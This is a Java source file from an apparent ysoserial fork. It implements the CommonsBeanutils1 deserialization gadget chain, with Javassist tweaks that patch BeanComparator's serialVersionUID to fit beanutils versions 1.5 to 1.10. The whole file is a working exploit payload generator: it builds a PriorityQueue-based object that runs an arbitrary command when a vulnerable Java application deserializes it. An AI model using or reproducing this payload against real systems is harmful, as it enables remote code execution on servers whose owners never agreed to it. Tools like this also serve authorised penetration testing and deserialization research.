package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.5-1.10,命令后面:_version,eg:calc_1.8,默认1.9"})
@Authors({Authors.Unam4})
public class CommonsBeanutils1 implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1.class, new String[]{"open ._1.6"});
    }

    public Object getObject(final String command) throws Exception {
        // mock method name until armed
        String cmd = "";
        if (command.contains("_")) {
            String[] s = command.split("_");
            cmd = s[0];
            if (s[1].equals("1.8")|| s[1].equals("1.7")) {
                ClassPool pool = ClassPool.getDefault();
                CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
                CtField field = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);
                ctClass.addField(field);
                ctClass.toClass();
            }else if (s[1].equals("1.10")) {
                ClassPool pool = ClassPool.getDefault();
                CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
                CtField field = CtField.make("private static final long serialVersionUID = 1L;", ctClass);
                ctClass.addField(field);
                ctClass.toClass();
            }else if (s[1].equals("1.6")) {
                ClassPool pool = ClassPool.getDefault();
                CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
                CtField field = CtField.make("private static final long serialVersionUID = 2573799559215537819L;", ctClass);
                ctClass.addField(field);
                ctClass.toClass();
            }else if (s[1].equals("1.5")) {
                ClassPool pool = ClassPool.getDefault();
                CtClass ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
                CtField field = CtField.make("private static final long serialVersionUID = 5123381023979609048L;", ctClass);
                ctClass.addField(field);
                ctClass.toClass();
            }

        }else {
            cmd = command;
        }
        final Object templates = Gadgets.createTemplatesImpl(cmd);

        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}
